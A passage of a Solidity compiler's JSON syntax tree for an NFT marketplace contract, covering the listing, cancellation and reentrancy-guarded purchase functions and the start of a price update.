(address,address,uint256,uint256)"}},"id":2825,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2507:50:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2826,"nodeType":"EmitStatement","src":"2502:55:11"}]},"functionSelector":"89bfd38f","id":2828,"implemented":true,"kind":"function","modifiers":[{"arguments":[{"id":2768,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2761,"src":"2111:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2769,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2763,"src":"2123:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2770,"kind":"modifierInvocation","modifierName":{"id":2767,"name":"notListed","nodeType":"IdentifierPath","referencedDeclaration":2699,"src":"2101:9:11"},"nodeType":"ModifierInvocation","src":"2101:30:11"},{"arguments":[{"id":2772,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2761,"src":"2148:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2773,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2763,"src":"2160:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"expression":{"id":2774,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"2169:3:11","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":2775,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"2169:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"id":2776,"kind":"modifierInvocation","modifierName":{"id":2771,"name":"isOwner","nodeType":"IdentifierPath","referencedDeclaration":2759,"src":"2140:7:11"},"nodeType":"ModifierInvocation","src":"2140:40:11"}],"name":"listItem","nameLocation":"1985:8:11","nodeType":"FunctionDefinition","parameters":{"id":2766,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2761,"mutability":"mutable","name":"nftAddress","nameLocation":"2011:10:11","nodeType":"VariableDeclaration","scope":2828,"src":"2003:18:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2760,"name":"address","nodeType":"ElementaryTypeName","src":"2003:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2763,"mutability":"mutable","name":"tokenId","nameLocation":"2039:7:11","nodeType":"VariableDeclaration","scope":2828,"src":"2031:15:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2762,"name":"uint256","nodeType":"ElementaryTypeName","src":"2031:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2765,"mutability":"mutable","name":"price","nameLocation":"2064:5:11","nodeType":"VariableDeclaration","scope":2828,"src":"2056:13:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2764,"name":"uint256","nodeType":"ElementaryTypeName","src":"2056:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1993:82:11"},"returnParameters":{"id":2777,"nodeType":"ParameterList","parameters":[],"src":"2185:0:11"},"scope":3055,"src":"1976:588:11","stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"body":{"id":2860,"nodeType":"Block","src":"2760:117:11","statements":[{"expression":{"id":2851,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"delete","prefix":true,"src":"2770:40:11","subExpression":{"components":[{"baseExpression":{"baseExpression":{"id":2845,"name":"s_listings","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2667,"src":"2778:10:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$_$","typeString":"mapping(address => mapping(uint256 => struct NftMarketplace.Listing storage ref))"}},"id":2847,"indexExpression":{"id":2846,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2830,"src":"2789:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"2778:22:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$","typeString":"mapping(uint256 => struct NftMarketplace.Listing storage ref)"}},"id":2849,"indexExpression":{"id":2848,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2832,"src":"2801:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"2778:31:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage","typeString":"struct NftMarketplace.Listing storage ref"}}],"id":2850,"isConstant":false,"isInlineArray":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"TupleExpression","src":"2777:33:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage","typeString":"struct NftMarketplace.Listing storage ref"}},"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2852,"nodeType":"ExpressionStatement","src":"2770:40:11"},{"eventCall":{"arguments":[{"expression":{"id":2854,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"2838:3:11","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":2855,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"2838:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2856,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2830,"src":"2850:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2857,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2832,"src":"2862:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2853,"name":"ItemCanceled","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2650,"src":"2825:12:11","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":2858,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2825:45:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2859,"nodeType":"EmitStatement","src":"2820:50:11"}]},"functionSelector":"b2ddee06","id":2861,"implemented":true,"kind":"function","modifiers":[{"arguments":[{"id":2835,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2830,"src":"2685:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2836,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2832,"src":"2697:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"expression":{"id":2837,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"2706:3:11","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":2838,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"2706:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"id":2839,"kind":"modifierInvocation","modifierName":{"id":2834,"name":"isOwner","nodeType":"IdentifierPath","referencedDeclaration":2759,"src":"2677:7:11"},"nodeType":"ModifierInvocation","src":"2677:40:11"},{"arguments":[{"id":2841,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2830,"src":"2735:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2842,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2832,"src":"2747:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2843,"kind":"modifierInvocation","modifierName":{"id":2840,"name":"isListed","nodeType":"IdentifierPath","referencedDeclaration":2727,"src":"2726:8:11"},"nodeType":"ModifierInvocation","src":"2726:29:11"}],"name":"cancelListing","nameLocation":"2579:13:11","nodeType":"FunctionDefinition","parameters":{"id":2833,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2830,"mutability":"mutable","name":"nftAddress","nameLocation":"2610:10:11","nodeType":"VariableDeclaration","scope":2861,"src":"2602:18:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2829,"name":"address","nodeType":"ElementaryTypeName","src":"2602:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2832,"mutability":"mutable","name":"tokenId","nameLocation":"2638:7:11","nodeType":"VariableDeclaration","scope":2861,"src":"2630:15:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2831,"name":"uint256","nodeType":"ElementaryTypeName","src":"2630:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2592:59:11"},"returnParameters":{"id":2844,"nodeType":"ParameterList","parameters":[],"src":"2760:0:11"},"scope":3055,"src":"2570:307:11","stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"body":{"id":2933,"nodeType":"Block","src":"3019:511:11","statements":[{"assignments":[2876],"declarations":[{"constant":false,"id":2876,"mutability":"mutable","name":"listedItem","nameLocation":"3044:10:11","nodeType":"VariableDeclaration","scope":2933,"src":"3029:25:11","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_memory_ptr","typeString":"struct NftMarketplace.Listing"},"typeName":{"id":2875,"nodeType":"UserDefinedTypeName","pathNode":{"id":2874,"name":"Listing","nodeType":"IdentifierPath","referencedDeclaration":2632,"src":"3029:7:11"},"referencedDeclaration":2632,"src":"3029:7:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage_ptr","typeString":"struct NftMarketplace.Listing"}},"visibility":"internal"}],"id":2882,"initialValue":{"baseExpression":{"baseExpression":{"id":2877,"name":"s_listings","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2667,"src":"3057:10:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$_$","typeString":"mapping(address => mapping(uint256 => struct NftMarketplace.Listing storage ref))"}},"id":2879,"indexExpression":{"id":2878,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2863,"src":"3068:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"3057:22:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$","typeString":"mapping(uint256 => struct NftMarketplace.Listing storage ref)"}},"id":2881,"indexExpression":{"id":2880,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2865,"src":"3080:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"3057:31:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage","typeString":"struct NftMarketplace.Listing storage ref"}},"nodeType":"VariableDeclarationStatement","src":"3029:59:11"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2887,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":2883,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"3102:3:11","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":2884,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"value","nodeType":"MemberAccess","src":"3102:9:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"expression":{"id":2885,"name":"listedItem","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2876,"src":"3114:10:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_memory_ptr","typeString":"struct NftMarketplace.Listing memory"}},"id":2886,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberName":"price","nodeType":"MemberAccess","referencedDeclaration":2629,"src":"3114:16:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"3102:28:11","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2896,"nodeType":"IfStatement","src":"3098:116:11","trueBody":{"id":2895,"nodeType":"Block","src":"3132:82:11","statements":[{"errorCall":{"arguments":[{"id":2889,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2863,"src":"3165:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2890,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2865,"src":"3177:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"expression":{"id":2891,"name":"listedItem","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2876,"src":"3186:10:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_memory_ptr","typeString":"struct NftMarketplace.Listing memory"}},"id":2892,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberName":"price","nodeType":"MemberAccess","referencedDeclaration":2629,"src":"3186:16:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2888,"name":"PriceNotMet","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2599,"src":"3153:11:11","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function (address,uint256,uint256) pure"}},"id":2893,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3153:50:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2894,"nodeType":"RevertStatement","src":"3146:57:11"}]}},{"expression":{"id":2903,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":2897,"name":"s_proceeds","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2671,"src":"3223:10:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":2900,"indexExpression":{"expression":{"id":2898,"name":"listedItem","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2876,"src":"3234:10:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_memory_ptr","typeString":"struct NftMarketplace.Listing memory"}},"id":2899,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberName":"seller","nodeType":"MemberAccess","referencedDeclaration":2631,"src":"3234:17:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"3223:29:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"expression":{"id":2901,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"3256:3:11","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":2902,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"value","nodeType":"MemberAccess","src":"3256:9:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"3223:42:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2904,"nodeType":"ExpressionStatement","src":"3223:42:11"},{"expression":{"id":2911,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"delete","prefix":true,"src":"3275:40:11","subExpression":{"components":[{"baseExpression":{"baseExpression":{"id":2905,"name":"s_listings","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2667,"src":"3283:10:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$_$","typeString":"mapping(address => mapping(uint256 => struct NftMarketplace.Listing storage ref))"}},"id":2907,"indexExpression":{"id":2906,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2863,"src":"3294:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"3283:22:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$","typeString":"mapping(uint256 => struct NftMarketplace.Listing storage ref)"}},"id":2909,"indexExpression":{"id":2908,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2865,"src":"3306:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"3283:31:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage","typeString":"struct NftMarketplace.Listing storage ref"}}],"id":2910,"isConstant":false,"isInlineArray":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"TupleExpression","src":"3282:33:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage","typeString":"struct NftMarketplace.Listing storage ref"}},"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2912,"nodeType":"ExpressionStatement","src":"3275:40:11"},{"expression":{"arguments":[{"expression":{"id":2917,"name":"listedItem","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2876,"src":"3375:10:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_memory_ptr","typeString":"struct NftMarketplace.Listing memory"}},"id":2918,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberName":"seller","nodeType":"MemberAccess","referencedDeclaration":2631,"src":"3375:17:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"expression":{"id":2919,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"3406:3:11","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":2920,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"3406:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2921,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2865,"src":"3430:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"arguments":[{"id":2914,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2863,"src":"3333:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":2913,"name":"IERC721","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1114,"src":"3325:7:11","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_IERC721_$1114_$","typeString":"type(contract IERC721)"}},"id":2915,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3325:19:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_IERC721_$1114","typeString":"contract IERC721"}},"id":2916,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"safeTransferFrom","nodeType":"MemberAccess","referencedDeclaration":1069,"src":"3325:36:11","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256) external"}},"id":2922,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3325:122:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2923,"nodeType":"ExpressionStatement","src":"3325:122:11"},{"eventCall":{"arguments":[{"expression":{"id":2925,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"3473:3:11","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":2926,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"3473:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2927,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2863,"src":"3485:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2928,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2865,"src":"3497:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"expression":{"id":2929,"name":"listedItem","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2876,"src":"3506:10:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_memory_ptr","typeString":"struct NftMarketplace.Listing memory"}},"id":2930,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberName":"price","nodeType":"MemberAccess","referencedDeclaration":2629,"src":"3506:16:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2924,"name":"ItemBought","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2660,"src":"3462:10:11","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256,uint256)"}},"id":2931,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3462:61:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2932,"nodeType":"EmitStatement","src":"3457:66:11"}]},"functionSelector":"9f37092a","id":2934,"implemented":true,"kind":"function","modifiers":[{"arguments":[{"id":2868,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2863,"src":"2985:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2869,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2865,"src":"2997:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2870,"kind":"modifierInvocation","modifierName":{"id":2867,"name":"isListed","nodeType":"IdentifierPath","referencedDeclaration":2727,"src":"2976:8:11"},"nodeType":"ModifierInvocation","src":"2976:29:11"},{"id":2872,"kind":"modifierInvocation","modifierName":{"id":2871,"name":"nonReentrant","nodeType":"IdentifierPath","referencedDeclaration":29,"src":"3006:12:11"},"nodeType":"ModifierInvocation","src":"3006:12:11"}],"name":"buyItem","nameLocation":"2892:7:11","nodeType":"FunctionDefinition","parameters":{"id":2866,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2863,"mutability":"mutable","name":"nftAddress","nameLocation":"2917:10:11","nodeType":"VariableDeclaration","scope":2934,"src":"2909:18:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2862,"name":"address","nodeType":"ElementaryTypeName","src":"2909:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2865,"mutability":"mutable","name":"tokenId","nameLocation":"2945:7:11","nodeType":"VariableDeclaration","scope":2934,"src":"2937:15:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2864,"name":"uint256","nodeType":"ElementaryTypeName","src":"2937:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2899:59:11"},"returnParameters":{"id":2873,"nodeType":"ParameterList","parameters":[],"src":"3019:0:11"},"scope":3055,"src":"2883:647:11","stateMutability":"payable","virtual":false,"visibility":"external"},{"body":{"id":2980,"nodeType":"Block","src":"3773:215:11","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2957,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2955,"name":"newPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2940,"src":"3787:8:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<=","rightExpression":{"hexValue":"30","id":2956,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"3799:1:11","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"3787:13:11","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2962,"nodeType":"IfStatement","src":"3783:73:11","trueBody":{"id":2961,"nodeType":"Block","src":"3802:54:11","statements":[{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":2958,"name":"PriceMustBeAboveZero","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2625,"src":"3823:20:11","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$__$","typeString":"function () pure"}},"id":2959,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3823:22:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2960,"nodeType":"RevertStatement","src":"3816:29:11"}]}},{"expression":{"id":2970,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"expression":{"baseExpression":{"baseExpression":{"id":2963,"name":"s_listings","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2667,"src":"3865:10:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$_$","typeString":"mapping(address => mapping(uint256 => struct NftMarketplace.Listing storage ref))"}},"id":2966,"indexExpression":{"id":2964,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2936,"src":"3876:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"3865:22:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$","typeString":"mapping(uint256 => struct NftMarketplace.Listing storage ref)"}},"id":2967,"indexExpression":{"id":2965,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2938,"src":"3888:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"3865:31:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage","typeString":"struct NftMarketplace.Listing storage 